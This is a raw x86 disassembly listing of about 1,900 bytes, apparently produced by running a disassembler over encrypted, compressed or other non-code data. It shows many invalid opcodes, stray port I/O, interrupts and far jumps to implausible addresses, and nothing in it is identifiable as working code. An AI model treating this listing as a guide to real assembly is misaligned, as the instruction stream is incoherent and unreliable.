  402976:	in     al,dx
  402977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402978:	cmp    BYTE PTR [edi-0x9],bh
  40297b:	std    
  40297c:	add    BYTE PTR [ebp-0x6c7d2b93],dl
  402982:	loopne 0x40291c
  402984:	inc    ecx
  402985:	mov    al,ds:0x1a86d3e5
  40298a:	aam    0xdd
  40298c:	into   
  40298d:	pop    es
  40298e:	mov    BYTE PTR [ebx-0x5c438768],ah
  402994:	aaa    
  402995:	test   edx,edi
  402997:	les    ecx,FWORD PTR [eax+0x3d]
  40299a:	push   ds
  40299b:	ret    0x7cf0
  40299e:	ins    BYTE PTR es:[di],dx
  4029a0:	popf   
  4029a1:	outs   dx,DWORD PTR ds:[esi]
  4029a2:	pop    ebp
  4029a3:	or     al,BYTE PTR [esi]
  4029a5:	ss jns 0x4029de
  4029a8:	sbb    ebp,eax
  4029aa:	mov    edx,0x7e50827e
  4029af:	xchg   ebp,eax
  4029b0:	add    BYTE PTR [ecx],al
  4029b2:	xor    ebx,DWORD PTR [ebx]
  4029b4:	js     0x40299a
  4029b6:	or     ah,dh
  4029b8:	inc    ebp
  4029b9:	dec    edx
  4029ba:	aaa    
  4029bb:	adc    dl,BYTE PTR [eax]
  4029bd:	jg     0x4029ae
  4029bf:	inc    ebp
  4029c0:	iret   
  4029c1:	ret    
  4029c2:	sub    BYTE PTR [edi-0x2c4be753],0xc2
  4029c9:	and    bl,BYTE PTR [edx-0x4c83cde1]
  4029cf:	les    esi,FWORD PTR [eax-0x745cd900]
  4029d5:	push   ebx
  4029d6:	and    eax,DWORD PTR [ebp+0x53e762c8]
  4029dc:	dec    ebp
  4029dd:	cmp    dh,BYTE PTR [ecx-0x4ff18fe5]
  4029e3:	add    esp,DWORD PTR [edx]
  4029e5:	push   edi
  4029e6:	out    0xa4,eax
  4029e8:	push   esp
  4029e9:	fild   WORD PTR [esi-0x5b1465b8]
  4029ef:	shr    DWORD PTR [ebx+0x7c],cl
  4029f2:	call   0xa40610a8
  4029f7:	cwde   
  4029f8:	inc    eax
  4029f9:	push   edi
  4029fa:	add    al,0xc0
  4029fc:	cmp    ch,BYTE PTR fs:[ebx]
  4029ff:	lods   al,BYTE PTR ds:[esi]
  402a00:	add    edx,esp
  402a02:	fst    st(5)
  402a04:	retf   
  402a05:	push   0x57
  402a07:	push   esp
  402a08:	imul   edx,DWORD PTR [edx-0x4f],0xffffffab
  402a0c:	mov    fs,edi
  402a0e:	or     ebp,DWORD PTR [ecx+0x7dd0873c]
  402a14:	mov    cl,0xf1
  402a16:	add    al,0x3
  402a18:	icebp  
  402a19:	push   0xb1906266
  402a1e:	mov    al,ds:0x17775759
  402a23:	pop    eax
  402a24:	dec    ebx
  402a25:	cmp    dh,bh
  402a27:	jl     0x402a02
  402a29:	pop    DWORD PTR [ebx+0x7249febf]
  402a2f:	xchg   esi,eax
  402a30:	fld    QWORD PTR [ecx]
  402a32:	sahf   
  402a33:	cmp    BYTE PTR [edx+0x56],cl
  402a36:	std    
  402a37:	mov    edx,0x8f6855ec
  402a3c:	mov    ch,0x45
  402a3e:	lds    eax,FWORD PTR [ebx+0x2cd86f1d]
  402a44:	je     0x4029d3
  402a46:	jp     0x402a8b
  402a48:	test   BYTE PTR [ebx+ecx*8],bh
  402a4b:	shl    edx,0x9c
  402a4e:	adc    DWORD PTR ds:0x2447aadf,ebx
  402a54:	or     al,0x5f
  402a56:	out    dx,al
  402a57:	pop    ebp
  402a58:	sub    DWORD PTR [ebx-0x2a],ebp
  402a5b:	and    DWORD PTR [ebx],edi
  402a5d:	mov    bl,0x28
  402a5f:	retf   
  402a60:	sbb    eax,0xb0dc2ca4
  402a65:	rcl    DWORD PTR [eax],cl
  402a67:	mov    ax,fs
  402a6a:	data16 int 0xf8
  402a6d:	clc    
  402a6e:	push   esp
  402a6f:	mov    bl,0xb
  402a71:	dec    esi
  402a72:	sbb    DWORD PTR [ebp+0x5ea60865],esp
  402a78:	repz retf 0x60ed
  402a7c:	pop    es
  402a7d:	jne    0x402a94
  402a7f:	pop    ecx
  402a80:	push   0x64
  402a82:	lea    edi,[ebx]
  402a84:	loop   0x402a4f
  402a86:	mov    dh,BYTE PTR ds:0xacd13085
  402a8c:	sub    DWORD PTR [edi+0x4c],ebx
  402a8f:	pop    ecx
  402a90:	ins    DWORD PTR es:[edi],dx
  402a91:	ffree  st(1)
  402a93:	test   BYTE PTR fs:[ebp+0x78],0x67
  402a98:	and    al,0xd1
  402a9a:	ins    DWORD PTR es:[edi],dx
  402a9b:	push   esi
  402a9c:	loop   0x402a5f
  402a9e:	sub    esi,0x4e055ed4
  402aa4:	(bad)  
  402aa5:	push   ds
  402aa6:	adc    esp,edx
  402aa8:	idiv   DWORD PTR [eax+0x50]
  402aab:	cmp    ah,BYTE PTR [esi]
  402aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aae:	loope  0x402acc
  402ab0:	dec    ebp
  402ab1:	into   
  402ab2:	sti    
  402ab3:	mov    bl,0xff
  402ab5:	xchg   edi,eax
  402ab6:	jp     0x402af9
  402ab8:	stos   DWORD PTR es:[edi],eax
  402ab9:	sbb    al,0xec
  402abb:	stos   DWORD PTR es:[edi],eax
  402abc:	inc    edi
  402abd:	adc    ebx,DWORD PTR [esi-0x194bb76f]
  402ac3:	jne    0x402b3f
  402ac5:	mov    bh,0xc0
  402ac7:	sbb    cl,BYTE PTR [ebx+edi*8]
  402aca:	push   es
  402acb:	ins    DWORD PTR es:[edi],dx
  402acc:	(bad)  
  402ace:	push   ebx
  402acf:	push   ss
  402ad0:	add    edi,DWORD PTR [eax]
  402ad2:	dec    esp
  402ad3:	cmp    BYTE PTR [eax+ebp*1],al
  402ad6:	stos   DWORD PTR es:[edi],eax
  402ad7:	ins    BYTE PTR es:[edi],dx
  402ad8:	mov    edx,0x23031e13
  402add:	mov    bh,BYTE PTR gs:[ebp+0x9b25c8a]
  402ae4:	push   ss
  402ae5:	cmc    
  402ae6:	and    BYTE PTR [edi+0x31],dl
  402ae9:	pop    esi
  402aea:	data16 sbb cl,BYTE PTR ds:0x2d757991
  402af1:	pop    ds
  402af2:	clc    
  402af3:	sub    eax,0x45475a02
  402af8:	sti    
  402af9:	pop    es
  402afa:	call   0x2f79:0xad0662
  402b01:	jo     0x402a95
  402b03:	jae    0x402ab4
  402b05:	aad    0x15
  402b07:	nop
  402b08:	mul    DWORD PTR [ecx+0x1d]
  402b0b:	adc    al,0xf3
  402b0d:	lds    ebx,FWORD PTR [ebp+0x9]
  402b10:	jns    0x402b01
  402b12:	dec    edi
  402b13:	cmp    eax,0x1d4b5fa
  402b18:	cmp    DWORD PTR [eax+0x5a],0xffffff9d
  402b1c:	cs ins BYTE PTR es:[edi],dx
  402b1e:	xchg   ebp,eax
  402b1f:	inc    ebp
  402b20:	cmp    ah,BYTE PTR [edx+0x4a]
  402b23:	inc    esp
  402b24:	arpl   bp,cx
  402b26:	xchg   ecx,eax
  402b27:	xor    al,BYTE PTR [ebx-0x51fa67bf]
  402b2d:	cmp    eax,0x9e84c388
  402b32:	bound  ebp,QWORD PTR [edx]
  402b34:	mov    esp,0xc5040b22
  402b39:	or     edi,eax
  402b3b:	pop    edi
  402b3c:	ror    BYTE PTR [ecx+0x4f57b7d4],1
  402b42:	icebp  
  402b43:	mov    dh,ah
  402b45:	(bad)  
  402b46:	sbb    eax,0x2a35c142
  402b4b:	sbb    eax,0xe17f4742
  402b50:	lahf   
  402b51:	out    dx,al
  402b52:	pop    esi
  402b53:	push   DWORD PTR [eax+ecx*2+0x79]
  402b57:	mov    ebp,0x3f36920c
  402b5c:	out    0x4,al
  402b5e:	mov    esp,0xd5a2f6cd
  402b63:	lahf   
  402b64:	aaa    
  402b65:	into   
  402b66:	pop    ecx
  402b67:	ins    BYTE PTR es:[edi],dx
  402b68:	sbb    BYTE PTR [ebp-0x7d391ef1],ch
  402b6e:	ret    0xf2a8
  402b71:	cwde   
  402b72:	or     bl,bh
  402b74:	and    ebp,esi
  402b76:	mov    cs,ebx
  402b78:	cmp    ecx,DWORD PTR [ebp-0x307a6337]
  402b7e:	icebp  
  402b7f:	sbb    edx,0x5525e7dc
  402b85:	test   DWORD PTR [ecx-0x53],0xdb35f021
  402b8c:	mov    edx,0xcc87626c
  402b91:	outs   dx,BYTE PTR ds:[esi]
  402b92:	hlt    
  402b93:	mov    edi,0xba8ca014
  402b98:	loopne 0x402bbf
  402b9a:	inc    edx
  402b9b:	mov    ds:0xe528a5d3,eax
  402ba0:	int    0xe2
  402ba2:	out    0xa6,al
  402ba4:	outs   dx,BYTE PTR ds:[esi]
  402ba5:	cdq    
  402ba6:	mov    gs,ebx
  402ba8:	jecxz  0x402bef
  402baa:	sub    eax,0x57fc7a93
  402baf:	in     al,dx
  402bb0:	sub    eax,0xab49c3f
  402bb5:	inc    esp
  402bb6:	lock cmp al,0x61
  402bb9:	imul   esp,DWORD PTR [edi+0x51],0x11f19f51
  402bc0:	call   0x372:0xd4556eb9
  402bc7:	adc    BYTE PTR [ecx],ch
  402bc9:	push   esi
  402bca:	fisubr DWORD PTR [esi+0x28]
  402bcd:	(bad)  
  402bce:	xchg   edi,eax
  402bcf:	loope  0x402bce
  402bd1:	stos   BYTE PTR es:[edi],al
  402bd2:	test   BYTE PTR [edi+0x61d302e2],al
  402bd8:	adc    eax,0x703681c2
  402bdd:	sub    edx,ecx
  402bdf:	mov    cs,WORD PTR [edx+0x55c7ed4f]
  402be5:	pop    edx
  402be6:	int    0x58
  402be8:	test   DWORD PTR [ecx+0x591aedc8],esp
  402bee:	icebp  
  402bef:	test   al,0x1
  402bf1:	sbb    esp,DWORD PTR fs:0x4491c33
  402bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf9:	ret    0x9ec9
  402bfc:	popf   
  402bfd:	jne    0x402c5e
  402bff:	add    ebx,0x5c375a41
  402c05:	clc    
  402c06:	jmp    0x402b9c
  402c08:	lahf   
  402c09:	jmp    esi
  402c0b:	mov    WORD PTR [ecx+0x56a55b09],fs
  402c11:	jno    0x402c75
  402c13:	pop    ebx
  402c14:	xor    eax,0xa0942949
  402c19:	xor    eax,esi
  402c1b:	inc    edx
  402c1c:	mov    al,ds:0x88ca760c
  402c21:	je     0x402c43
  402c23:	sub    bh,ch
  402c25:	lea    esi,[edi+0x64]
  402c28:	inc    ecx
  402c29:	jb     0x402bc3
  402c2b:	inc    edx
  402c2c:	xor    al,BYTE PTR [ebx+0x52df73c2]
  402c32:	outs   dx,DWORD PTR ds:[esi]
  402c33:	sub    BYTE PTR [ebx],dl
  402c35:	(bad)  
  402c36:	push   cs
  402c37:	sahf   
  402c38:	lea    ecx,[eax+0x32]
  402c3b:	sbb    bh,BYTE PTR [ebp+0x252a7339]
  402c41:	adc    eax,0xdd13ec2d
  402c46:	int    0x3d
  402c48:	test   al,0x3b
  402c4a:	ja     0x402cb5
  402c4c:	fisubr WORD PTR [edx]
  402c4e:	std    
  402c4f:	fst    DWORD PTR [ecx]
  402c51:	xchg   ebp,eax
  402c52:	std    
  402c53:	loope  0x402c31
  402c55:	or     BYTE PTR [ebp+0x13a78784],ch
  402c5b:	(bad)  
  402c5c:	ror    BYTE PTR [ecx+0x79],1
  402c5f:	fiadd  DWORD PTR [edi+0x7493cdb7]
  402c65:	jecxz  0x402ca6
  402c67:	imul   esp,DWORD PTR [edx],0x623ed007
  402c6d:	ins    BYTE PTR es:[edi],dx
  402c6e:	inc    esp
  402c6f:	inc    esi
  402c70:	mov    edx,0x6eddb4b4
  402c75:	mov    bl,0xa5
  402c77:	xchg   edx,eax
  402c78:	call   0x27d50a9e
  402c7d:	(bad)  
  402c7e:	pop    ebx
  402c7f:	aam    0xd6
  402c81:	push   ebp
  402c82:	out    0xd5,eax
  402c84:	jl     0x402cc2
  402c86:	cmp    al,0x5a
  402c88:	(bad)  
  402c89:	ds call 0xbeac:0x3fbb9f24
  402c91:	js     0x402cec
  402c93:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c95:	sbb    al,0x5a
  402c97:	add    ebp,ecx
  402c99:	jae    0x402c98
  402c9b:	pushf  
  402c9c:	jmp    0x92d0:0x98bc5f94
  402ca3:	pop    es
  402ca4:	stc    
  402ca5:	cmp    BYTE PTR [ecx-0x37],0xf1
  402ca9:	stos   BYTE PTR es:[edi],al
  402caa:	or     al,0x44
  402cac:	push   edx
  402cad:	and    al,0xb1
  402caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb0:	mov    ebx,0xd8fee36c
  402cb5:	fisubr DWORD PTR [esi+0x70]
  402cb8:	jmp    0xa9018b7e
  402cbd:	in     eax,dx
  402cbe:	push   ecx
  402cbf:	push   eax
  402cc0:	out    dx,eax
  402cc1:	xlat   BYTE PTR ds:[ebx]
  402cc2:	push   0x2b
  402cc4:	rcr    DWORD PTR gs:[ecx+edx*4+0x1d],cl
  402cc9:	scas   eax,DWORD PTR es:[edi]
  402cca:	and    ecx,DWORD PTR [ebx+0x3eb07ff3]
  402cd0:	adc    ebx,DWORD PTR [edi]
  402cd2:	push   ebx
  402cd3:	outs   dx,BYTE PTR ds:[esi]
  402cd4:	in     eax,dx
  402cd5:	jno    0x402ca7
  402cd7:	pop    edx
  402cd8:	or     ebx,esi
  402cda:	adc    al,0xac
  402cdc:	jnp    0x402d12
  402cde:	and    cl,al
  402ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce1:	sahf   
  402ce2:	xchg   esp,eax
  402ce3:	sahf   
  402ce4:	mov    esi,0xc9378c79
  402ce9:	retf   
  402cea:	test   eax,0x3c9a967e
  402cef:	push   edi
  402cf0:	int    0x96
  402cf2:	pop    ecx
  402cf3:	mov    edi,0xf01cff9e
  402cf8:	dec    eax
  402cf9:	sub    dl,ah
  402cfb:	pop    ecx
  402cfc:	dec    esi
  402cfd:	(bad)  
  402cfe:	aas    
  402cff:	mov    ecx,0x8c17e1c8
  402d04:	jae    0x402cc1
  402d06:	outs   dx,BYTE PTR ds:[esi]
  402d07:	in     al,dx
  402d08:	inc    ebx
  402d09:	cmp    al,0x98
  402d0b:	sub    BYTE PTR [edi+0x67a14cf4],ch
  402d11:	adc    eax,0x5bf3e2f
  402d16:	out    dx,eax
  402d17:	mov    edi,0xda9a2e32
  402d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1d:	mov    ebp,0xa867e7f9
  402d22:	call   FWORD PTR [esi+ebx*8]
  402d25:	ins    BYTE PTR es:[edi],dx
  402d26:	jo     0x402da4
  402d28:	mov    ch,0x16
  402d2a:	add    DWORD PTR [esi-0x42f67d7a],0xf26a1ec
  402d34:	int    0x3
  402d36:	popa   
  402d37:	adc    ah,BYTE PTR [esi+edi*2+0x56]
  402d3b:	mov    cl,bl
  402d3d:	inc    ebp
  402d3e:	aas    
  402d3f:	mov    BYTE PTR [eax+0x2e],al
  402d42:	jns    0x402d91
  402d44:	mov    al,0xd7
  402d46:	fisttp QWORD PTR [esp+ebx*4]
  402d49:	cs pop ss
  402d4b:	mov    eax,ds:0x10e0becb
  402d50:	jl     0x402da8
  402d52:	and    al,0xf0
  402d54:	xchg   ecx,eax
  402d55:	pop    ebx
  402d56:	ds push esi
  402d58:	adc    al,0xa4
  402d5a:	int    0x72
  402d5c:	imul   ebx,ebx,0xf8263637
  402d62:	sar    BYTE PTR [eax],cl
  402d64:	fs sbb eax,0x9f102fe2
  402d6a:	jno    0x402d4b
  402d6c:	in     al,0xb1
  402d6e:	fwait
  402d6f:	jnp    0x402dd3
  402d71:	jl     0x402d64
  402d73:	mov    ds:0x47ea35e9,eax
  402d78:	retf   0x1ef5
  402d7b:	aaa    
  402d7c:	jo     0x402d6e
  402d7e:	jns    0x402d9c
  402d80:	adc    dh,BYTE PTR [edi+esi*2]
  402d83:	inc    edi
  402d84:	push   es
  402d85:	daa    
  402d86:	push   eax
  402d87:	pop    eax
  402d88:	mov    ebx,0xce52fd11
  402d8d:	int    0x4
  402d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d90:	push   esp
  402d91:	push   ebx
  402d92:	jl     0x402d73
  402d94:	mov    ebp,0x3a838c3
  402d99:	xlat   BYTE PTR ds:[ebx]
  402d9a:	xlat   BYTE PTR ds:[ebx]
  402d9b:	push   edx
  402d9c:	mov    bh,0xdc
  402d9e:	std    
  402d9f:	lock xchg ebx,eax
  402da1:	shr    BYTE PTR [ecx-0x2],cl
  402da4:	add    eax,0x54312b6f
  402da9:	clc    
  402daa:	add    ch,BYTE PTR [ebx]
  402dac:	outs   dx,DWORD PTR ds:[esi]
  402dad:	sub    eax,0xf5847e44
  402db2:	sub    eax,0xeaf36944
  402db7:	bound  ecx,QWORD PTR [edi+ebp*4]
  402dba:	jo     0x402d95
  402dbc:	(bad)  
  402dbd:	int    0x49
  402dbf:	out    dx,eax
  402dc0:	mov    al,0x81
  402dc2:	out    dx,al
  402dc3:	js     0x402de4
  402dc5:	mov    dh,BYTE PTR [edx-0xc40c068]
  402dcb:	xchg   edx,eax
  402dcc:	fdivr  QWORD PTR [ebx+ecx*8+0x728d57f4]
  402dd3:	pop    ebx
  402dd4:	mov    ds:0x4b030b49,eax
  402dd9:	out    dx,al
  402dda:	mov    ds:0xee7cbbf2,al
  402ddf:	lock sbb eax,0x2fc7c0d4
  402de5:	add    eax,0xffffffbb
  402de8:	sub    al,0xf5
  402dea:	in     eax,dx
  402deb:	jmp    0x742cc365
  402df0:	inc    edx
  402df1:	test   al,0xd3
  402df3:	clc    
  402df4:	nop
  402df5:	mov    al,0xe7
  402df7:	cmc    
  402df8:	out    dx,eax
  402df9:	sbb    bh,dl
  402dfb:	cld    
  402dfc:	call   0x74e8:0xa30a2813
  402e03:	mov    ds:0x73456899,al
  402e08:	xchg   edi,eax
  402e09:	sbb    cl,BYTE PTR [eax+edi*2+0x4e]
  402e0d:	dec    edi
  402e0e:	mov    al,0xa5
  402e10:	scas   eax,DWORD PTR es:[edi]
  402e11:	jge    0x402dec
  402e13:	pop    ecx
  402e14:	mov    esi,0x4923bbf
  402e19:	mov    esi,0x31cbcc1
  402e1e:	rol    BYTE PTR [ecx],0xb7
  402e21:	add    al,BYTE PTR [esi]
  402e23:	popa   
  402e24:	and    DWORD PTR [edi+0x6e],ecx
  402e27:	mov    WORD PTR [eax+0x51cfb0c2],?
  402e2d:	mov    al,0xd0
  402e2f:	fnstcw WORD PTR [edi+0x3f6edeb7]
  402e35:	data16 mov ds:0xba48f7f7,al
  402e3b:	pop    ecx
  402e3c:	xor    eax,0x30acc290
  402e41:	cmp    eax,0xe7a0e984
  402e46:	add    eax,0x2eef3022
  402e4b:	outs   dx,BYTE PTR ds:[esi]
  402e4c:	fucomp st(4)
  402e4e:	inc    ebp
  402e4f:	pop    edi
  402e50:	clc    
  402e51:	rcr    BYTE PTR [edx],cl
  402e53:	adc    edx,DWORD PTR [esi-0x65]
  402e56:	inc    eax
  402e57:	retf   
  402e58:	or     eax,0xdd7ee70d
  402e5d:	(bad)  
  402e5e:	xor    eax,0xd560a45d
  402e63:	arpl   WORD PTR [edi-0x7a],sp
  402e66:	test   al,0xea
  402e68:	stc    
  402e69:	push   ss
  402e6a:	or     DWORD PTR [eax+0x26cb927c],ecx
  402e70:	(bad)  
  402e71:	std    
  402e72:	retf   
  402e73:	pop    ss
  402e74:	rcl    DWORD PTR [ebx+0xe],1
  402e77:	mov    ch,0x8f
  402e79:	cmp    bh,bh
  402e7b:	scas   eax,DWORD PTR es:[edi]
  402e7c:	shl    BYTE PTR [ecx+0x67],cl
  402e7f:	push   ds
  402e80:	or     al,0xaf
  402e82:	in     eax,0xee
  402e84:	jb     0x402e1d
  402e86:	nop
  402e87:	fwait
  402e88:	clc    
  402e89:	mov    esp,DWORD PTR [ebx]
  402e8b:	jge    0x402e0d
  402e8d:	shr    bl,0x3c
  402e90:	add    cl,dh
  402e92:	sub    eax,0x81cd9d38
  402e97:	mov    ch,0xda
  402e99:	dec    ebx
  402e9a:	jne    0x402e79
  402e9c:	push   ebp
  402e9d:	jae    0x402ee9
  402e9f:	push   ebp
  402ea0:	add    al,0x83
  402ea2:	jmp    0xebb65305
  402ea7:	leave  
  402ea8:	in     al,0x5f
  402eaa:	mov    edx,0x55c1b6ac
  402eaf:	or     al,0x20
  402eb1:	inc    esp
  402eb2:	int3   
  402eb3:	je     0x402e5b
  402eb5:	mov    edi,0xba94803
  402eba:	add    BYTE PTR [esi+edx*8+0x768cfa12],ah
  402ec1:	adc    edi,edx
  402ec3:	push   es
  402ec4:	or     cl,al
  402ec6:	int    0x9b
  402ec8:	push   cs
  402ec9:	stos   DWORD PTR es:[edi],eax
  402eca:	xchg   edi,esi
  402ecc:	lods   al,BYTE PTR ds:[esi]
  402ecd:	stc    
  402ece:	out    0xc2,eax
  402ed0:	cmp    eax,0x823ad45b
  402ed5:	and    DWORD PTR [ecx+0x43],edx
  402ed8:	rcl    BYTE PTR [eax],1
  402eda:	inc    edx
  402edb:	mov    si,0x17da
  402edf:	and    DWORD PTR [ecx+0x29],0x5c
  402ee3:	jne    0x402f1a
  402ee5:	lods   al,BYTE PTR ds:[esi]
  402ee6:	(bad)  
  402ee7:	mov    BYTE PTR [ebx+0x58],0x85
  402eeb:	mov    eax,0x1ac90bf9
  402ef0:	bound  esp,QWORD PTR [esi+0x715dfd0e]
  402ef6:	jl     0x402f23
  402ef8:	fsubr  st,st(2)
  402efa:	fs pop ss
  402efc:	bnd jl 0x402f1d
  402eff:	jno    0x402f31
  402f01:	or     BYTE PTR [edx-0x14af6eb9],ah
  402f07:	stos   DWORD PTR es:[edi],eax
  402f08:	pop    esi
  402f09:	mov    ah,0xad
  402f0b:	in     al,0xc4
  402f0d:	mov    bh,0x8e
  402f0f:	jns    0x402ef2
  402f11:	cmc    
  402f12:	mov    edx,0xa335ea19
  402f17:	test   eax,0xe7e7bc6f
  402f1c:	sahf   
  402f1d:	and    al,0xe9
  402f1f:	push   esp
  402f20:	mov    WORD PTR [ecx],fs
  402f22:	or     al,0x20
  402f24:	das    
  402f25:	in     eax,0x7c
  402f27:	xchg   esp,eax
  402f28:	jecxz  0x402eb7
  402f2a:	sbb    ch,BYTE PTR [ebp+ebx*4+0x2a806f11]
  402f31:	loopne 0x402eeb
  402f33:	xchg   DWORD PTR [edx+0x3c],edx
  402f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f37:	jecxz  0x402f06
  402f39:	ret    0xd4ec
  402f3c:	push   edx
  402f3d:	ror    DWORD PTR [edx],1
  402f3f:	push   0xfffffffa
  402f41:	shr    dl,cl
  402f43:	iret   
  402f44:	xchg   ebx,eax
  402f45:	iret   
  402f46:	fscale 
  402f48:	(bad)  
  402f49:	std    
  402f4a:	jp     0x402f31
  402f4c:	adc    DWORD PTR [esi+ecx*2+0x19],edi
  402f50:	add    dh,bl
  402f52:	push   edi
  402f53:	into   
  402f54:	test   DWORD PTR [eax],esi
  402f56:	shr    DWORD PTR [esp-0x5a],1
  402f5a:	mov    eax,DWORD PTR [edi]
  402f5c:	xchg   esi,eax
  402f5d:	pop    ss
  402f5e:	add    DWORD PTR [esi+0x72],ebp
  402f61:	call   0x1ef96fb9
  402f66:	enter  0x2357,0x6f
  402f6a:	xor    esp,DWORD PTR ds:0xbed8c054
  402f70:	jl     0x402f1b
  402f72:	ds or  edi,esp
  402f75:	sub    BYTE PTR [ecx+0x107f5870],al
  402f7b:	or     al,ah
  402f7d:	shl    DWORD PTR [ebx+ebx*1+0x1b],cl
  402f81:	push   eax
  402f82:	mov    ds:0xdcab8b4b,al
  402f87:	mov    esi,0x7d681577
  402f8c:	ins    DWORD PTR es:[edi],dx
  402f8d:	in     eax,dx
  402f8e:	int3   
  402f8f:	dec    esi
  402f90:	mov    ebx,0xa1a2823c
  402f95:	jmp    0x47ad:0xeba2bd79
  402f9c:	add    dh,cl
  402f9e:	or     al,0x9d
  402fa0:	dec    edx
  402fa1:	xchg   esp,eax
  402fa2:	xchg   ebx,eax
  402fa3:	adc    edx,DWORD PTR [ebp+0x28]
  402fa6:	pop    edi
  402fa7:	hlt    
  402fa8:	push   ebp
  402fa9:	test   BYTE PTR [ebp+0x5baa6c78],ch
  402faf:	and    eax,0x306bc3de
  402fb4:	test   BYTE PTR [ecx-0x30d2e7b4],0x6e
  402fbb:	and    dl,BYTE PTR [ebx-0x15]
  402fbe:	shl    BYTE PTR [ebx-0x741af1b2],0x8f
  402fc5:	in     al,dx
  402fc6:	mov    bl,0x78
  402fc8:	xchg   esi,eax
  402fc9:	sbb    edx,edx
  402fcb:	adc    eax,0xe9b5e779
  402fd0:	int3   
  402fd1:	test   DWORD PTR [ebp+0x74],eax
  402fd4:	push   0x7
  402fd6:	ret    0x2a70
  402fd9:	out    0x20,eax
  402fdb:	add    edx,eax
  402fdd:	ja     0x402f89
  402fdf:	clc    
  402fe0:	mul    DWORD PTR [ecx]
  402fe2:	js     0x40301f
  402fe4:	inc    ebx
  402fe5:	push   eax
  402fe6:	dec    esi
  402fe7:	cld    
  402fe8:	out    0x68,eax
  402fea:	(bad)  
  402fec:	not    bl
  402fee:	xchg   ebp,eax
  402fef:	fmulp  st(1),st
  402ff1:	cwde   
  402ff2:	pusha  
  402ff3:	mov    dl,0x7a
  402ff5:	rcl    ebx,1
  402ff7:	or     DWORD PTR [ebx-0x1e],0xffffffb2
  402ffb:	cdq    
  402ffc:	enter  0x91c3,0x22
  403000:	sbb    eax,0x88dbbf78
  403005:	mov    ebp,0x9be88ba0
  40300a:	cmp    eax,ebp
  40300c:	pop    ecx
  40300d:	int    0x64
  40300f:	mov    dl,0x31
  403011:	mov    ch,0xe7
  403013:	test   eax,0x5bc80a6a
  403018:	fistp  DWORD PTR [eax+0x53]
  40301b:	pop    es
  40301c:	ret    0x7667
  40301f:	ja     0x402ff7
  403021:	pop    esi
  403022:	out    dx,eax
  403023:	mov    ds:0xacb8c0cf,eax
  403028:	loopne 0x40303e
  40302a:	hlt    
  40302b:	adc    al,0x72
  40302d:	iret   
  40302e:	xchg   edi,eax
  40302f:	jno    0x402ff8
  403031:	inc    esp
  403032:	xlat   BYTE PTR ds:[ebx]
  403033:	pop    ebx
  403034:	dec    eax
  403035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403036:	mov    fs,WORD PTR [ebx-0x1e]
  403039:	push   edx
  40303a:	bound  esp,QWORD PTR [esp+ebp*2+0x16]
  40303e:	loope  0x403026
  403040:	mov    esi,0xce1623df
  403045:	inc    edi
  403046:	fld    DWORD PTR [ebp-0x42]
  403049:	mov    dh,0xc7
  40304b:	push   0x58
  40304d:	loopne 0x40301a
  40304f:	shl    BYTE PTR [edx-0x75],0xd7
  403053:	jno    0x403052
  403055:	stos   BYTE PTR es:[edi],al
  403056:	pop    ss
  403057:	mov    ch,0xcc
  403059:	sub    al,BYTE PTR [esi-0x3b54769f]
  40305f:	sub    DWORD PTR [edx-0x60e6a539],esp
  403065:	cwde   
  403066:	xor    bh,BYTE PTR [ebx]
  403068:	add    ecx,edi
  40306a:	pop    ds
  40306b:	mov    cl,0x2d
  40306d:	mov    ecx,0x9783eb38
  403072:	inc    edi
  403073:	pop    ebx
  403074:	dec    edi
  403075:	retf   0x3fa
  403078:	mov    bh,dl
  40307a:	cmp    eax,0xd5cc12fa
  40307f:	pop    es
  403080:	adc    bh,BYTE PTR [esi]
  403082:	mov    bl,0xcc
  403084:	test   DWORD PTR [ebp+0x6f645672],ebp
  40308a:	sbb    dh,dh
  40308c:	sub    BYTE PTR [edx],al
  40308e:	xchg   BYTE PTR [esi*8+0x7ffb4ae9],dh
  403095:	not    dh
  403097:	ja     0x403032
  403099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40309a:	ja     0x40310b
  40309c:	mov    bl,0xeb
  40309e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4030a0:	xor    BYTE PTR [eax+0x29],bh
  4030a3:	imul   edx,DWORD PTR [ecx-0x6042afdf],0xffffff9a
  4030aa:	jmp    0x3415df95
  4030af:	mov    ds:0xf2e7b14d,al
  4030b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b5:	dec    ebx
  4030b6:	push   cs
  4030b7:	outs   dx,DWORD PTR ds:[esi]
  4030b8:	dec    ebp
  4030b9:	imul   ebx,DWORD PTR [edi-0x25],0x4c7f9931
  4030c0:	rol    BYTE PTR [eax],0xcb
  4030c3:	dec    edi
  4030c4:	adc    DWORD PTR [edi+0x6d602496],0x7e
  4030cb:	stos   BYTE PTR es:[edi],al
  4030cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030cd:	sub    BYTE PTR [edx],bl
  4030cf:	sbb    bh,bh
  4030d1:	xchg   ebp,eax
  4030d2:	jb     0x403058
  4030d4:	aaa    
  4030d5:	dec    esi
  4030d6:	pop    ecx
  4030d7:	add    eax,0x7635f9b8
  4030dc:	(bad)
  4030df:	and    ch,al
  4030e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030e2:	sub    BYTE PTR [esi+0xb],bl
  4030e5:	sbb    al,0xed
  4030e7:	push   ss
  4030e8:	xchg   cx,ax
  4030ea:	aad    0x2c
  4030ec:	or     eax,0x3fbf6445
  4030f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f2:	divps  xmm4,XMMWORD PTR [ebp+0x75]
  4030f6:	cwde   
  4030f7:	pushf  
  4030f8:	jl     0x403134
  4030fa:	jmp    0x403144
  4030fc:	add    DWORD PTR [ecx-0x39],edx
  4030ff:	sub    dl,BYTE PTR [edi+0x78]
  403102:	shl    cl,1
  403104:	pop    es
